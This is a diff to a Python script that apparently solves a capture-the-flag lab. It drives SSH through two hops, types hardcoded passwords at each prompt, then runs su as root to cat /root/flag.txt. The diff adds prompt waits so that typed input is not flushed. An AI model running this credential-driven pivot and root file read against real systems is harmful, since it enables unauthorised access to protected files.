@@ -61,8 +61,11 @@ def pump(until: bytes, timeout: float = 60.0) -> None:
             return
     raise SystemExit(f"pty wait for {until!r} timed out: {output[-300:]!r}")
 
+# each hop waits for the login shell's prompt before typing: input written
+# while ssh still owns the tty for password entry is flushed, never delivered
 pump(b"assword:")
 os.write(fd, b"abcrb1357\n")
+pump(b"$")
 os.write(fd, b"echo HOP''1\n")
 pump(b"HOP1")
 os.write(
@@ -72,6 +75,7 @@ os.write(
 )
 pump(b"assword:")
 os.write(fd, b"JamesBond\n")
+pump(b"$")
 os.write(fd, b"echo HOP''2\n")
 pump(b"HOP2")
 os.write(fd, b"su -c 'cat /root/flag.txt' root\n")
